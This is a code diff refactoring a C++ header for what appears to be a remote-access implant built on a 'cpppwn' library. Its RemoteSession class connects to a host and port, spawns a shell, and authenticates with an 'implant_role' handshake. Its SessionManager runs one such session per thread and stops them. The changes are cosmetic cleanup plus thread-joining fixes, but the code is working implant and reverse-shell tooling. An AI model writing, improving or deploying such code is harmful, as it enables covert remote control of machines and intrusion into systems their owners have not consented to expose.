@@ -1,17 +1,16 @@
 #pragma once
 
-#include "Logger.hpp"
+#include "Util/SafeLogger.hpp"
 #include <Remote.hpp>
 #include <Shell.hpp>
 #include <SessionHandshake.hpp>
 #include <chrono>
 #include <string>
+#include <thread>
+#include <vector>
 
 #include <cpppwn.hpp>
 
-//-------------------------------------------------
-//
-//-------------------------------------------------
 class RemoteSession {
 private:
     std::atomic<bool>& global_running;
@@ -22,9 +21,6 @@ private:
     std::string password;
 
 public:
-    //-------------------------------------------------
-    //
-    //-------------------------------------------------
     RemoteSession(
         std::string id,
         std::string h,
@@ -39,9 +35,6 @@ public:
           username(std::move(user)),
           password(std::move(pass)) {}
 
-    //-------------------------------------------------
-    //
-    //-------------------------------------------------
     void run() {
         try {
             logger::debug("Session {}: Attempting connection to {}:{}", session_id, host, port);
@@ -50,8 +43,6 @@ public:
             logger::debug("Session {}: Connection established and shell spawned.", session_id);
 
             session_handshake::send(conn, session_handshake::implant_role, username, password);
-
-            logger::debug("global_running: {} | Connection: {} | Shell: {}", global_running ? "TRUE" : "FALSE", conn.is_alive() ? "TRUE" : "FALSE", shell.is_alive() ? "TRUE" : "FALSE");
 
             while (global_running && conn.is_alive() && shell.is_alive()) {
                 session_handshake::clear_recv_buffer(conn);
@@ -74,9 +65,6 @@ public:
     }
 };
 
-//-------------------------------------------------
-//
-//-------------------------------------------------
 class SessionManager {
 private:
     struct SessionEntry {
@@ -88,9 +76,6 @@ private:
     std::mutex mtx;
 
 public:
-    //-------------------------------------------------
-    //
-    //-------------------------------------------------
     void start_session(
         const std::string& id,
         const std::string& host,
@@ -98,11 +83,11 @@ public:
         const std::string& username,
         const std::string& password) {
         std::lock_guard lock(mtx);
-        if (sessions.contains(id)) return;
+        if (sessions.contains(id)) {
+            return;
+        }
 
         auto entry = std::make_unique<SessionEntry>();
-
-        // Spawn the shell thread
         entry->worker = std::thread([id, host, port, username, password, &run = entry->running_flag]() -> void {
             RemoteSession session(id, host, port, username, password, run);
             session.run();
@@ -111,19 +96,24 @@ public:
         sessions[id] = std::move(entry);
     }
 
-    //-------------------------------------------------
-    //
-    //-------------------------------------------------
     void stop_sessions() {
-        std::lock_guard lock(mtx);
-        if (sessions.size() > 0) {
-            for(auto& [id, session] : sessions) {
+        std::vector<std::thread> workers;
+        {
+            std::lock_guard lock(mtx);
+            workers.reserve(sessions.size());
+            for (auto& [id, session] : sessions) {
                 session->running_flag = false;
                 if (session->worker.joinable()) {
-                    session->worker.detach();
+                    workers.push_back(std::move(session->worker));
                 }
             }
             sessions.clear();
+        }
+
+        for (auto& worker : workers) {
+            if (worker.joinable()) {
+                worker.join();
+            }
         }
     }
 };
